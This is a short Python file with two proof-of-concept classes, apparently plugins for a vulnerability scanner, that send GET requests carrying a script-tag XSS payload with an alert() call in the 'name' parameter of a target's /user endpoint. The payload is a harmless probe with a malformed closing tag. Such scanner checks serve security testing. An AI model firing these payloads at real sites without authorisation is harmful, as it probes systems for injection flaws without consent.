import requests

class XssTest1(PocBase):
    pocflag="POC011|XSS注入测试1"
    def exploit(self):
        print("[+] 开始测试"+self.pocflag)
        headers = self.headers()
        url=self.target+"/user?name=abc<script>alert(1)<script>"
        res = requests.get(url, headers=self.headers(), timeout=3, verify=False)
        print(res)

class XssTest2(PocBase):
    pocflag="POC012|XSS注入测试2"
    def exploit(self):
        print("[+] 开始测试"+self.pocflag)
        headers = self.headers()
        url=self.target+"/user?name=abc<script>alert(2)<script>"
        res = requests.get(url, headers=self.headers(), timeout=3, verify=False)
        print(res)

